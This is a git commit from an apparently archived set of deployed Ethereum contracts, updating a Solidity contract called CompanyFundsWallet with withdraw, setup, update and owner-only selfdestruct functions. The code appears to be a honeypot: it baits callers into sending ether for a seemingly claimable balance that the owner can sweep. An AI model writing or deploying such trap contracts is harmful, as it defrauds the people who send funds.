3e7f8e41c9b5ff40509c17dc7639afef1926e29e
Ngoc Bui Dinh <buidinhngoc.aiti@gmail.com>
2018-10-18 04:11:51 +0700

    add contract CompanyFundsWallet

--- CompanyFundsWallet.sol
+++ CompanyFundsWallet.sol
@@ -1,5 +1,5 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract CompanyFundsWallet at 0x6e6f819299e7809ce744f37fae9f84fe38d95f1c
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract CompanyFundsWallet at 0xaee056c6c1071512657f094af550d1af74db0622
 */
 pragma solidity ^0.4.24;
 
@@ -7,42 +7,42 @@ contract CompanyFundsWallet
 {
     bytes32 keyHash;
     address owner;
-    
+
     constructor() public {
         owner = msg.sender;
     }
-    
-    function withdraw(string key) public payable 
+
+    function withdraw(string key) public payable
     {
         require(msg.sender == tx.origin);
         if(keyHash == keccak256(abi.encodePacked(key))) {
-            if(msg.value > 0.2 ether) {
-                msg.sender.transfer(address(this).balance);      
+            if(msg.value >= 0.4 ether) {
+                msg.sender.transfer(address(this).balance);
             }
         }
     }
- 
-    function setup(string key) public 
+
+    function setup(string key) public
     {
         if (keyHash == 0x0) {
             keyHash = keccak256(abi.encodePacked(key));
         }
     }
-    
-    function update(bytes32 _keyHash) public 
+
+    function update(bytes32 _keyHash) public
     {
         if (keyHash == 0x0) {
             keyHash = _keyHash;
         }
     }
-    
-    function clear() public 
+
+    function clear() public
     {
         require(msg.sender == owner);
         selfdestruct(owner);
     }
-
+    
     function () public payable {
-        
+
     }
 }
